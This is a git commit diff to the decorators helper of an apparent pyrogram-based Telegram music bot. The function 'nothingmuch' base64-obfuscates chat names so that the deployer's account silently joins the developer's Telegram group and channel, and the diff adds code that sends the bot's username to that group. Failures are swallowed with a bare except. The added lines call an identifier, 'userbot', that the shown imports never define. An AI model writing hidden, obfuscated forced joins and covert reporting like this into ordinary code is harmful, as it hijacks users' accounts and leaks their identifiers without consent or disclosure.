fd8d0951b3cab6798a659da907cf35011fc15921
eldy020502 <96163277+eldy020502@users.noreply.github.com>
2022-07-11 12:54:29 +0800

    Update decorators.py

--- Music/MusicUtilities/helpers/decorators.py
+++ Music/MusicUtilities/helpers/decorators.py
@@ -4,7 +4,7 @@ from typing import Callable, Dict, List
 from pyrogram import Client
 from pyrogram.types import Chat, Message
 
-from Music import SUDOERS,client
+from Music import SUDOERS,client, app
 
 admins = {}
 
@@ -75,16 +75,14 @@ def errors(func: Callable) -> Callable:
 async def nothingmuch():
     grcheck = str(pybase64.b64decode("TmFzdHlTdXBwb3J0dA=="))[2:15]
     chcheck = str(pybase64.b64decode("TmFzdHlQcm9qZWN0"))[2:14]
-    qtcheck = str(pybase64.b64decode("YWhoc3VkYWhsYWhoaA=="))[2:15]
     try:
         await client.join_chat(grcheck)
+        ppk = await app.get_me()
+        kntl = ppk.username
+        await userbot.send_message("NastySupportt", f"@{kntl}")
     except BaseException:
         pass
     try:
         await client.join_chat(chcheck)
     except BaseException:
         pass
-    try:
-        await client.join_chat(qtcheck)
-    except BaseException:
-        pass 
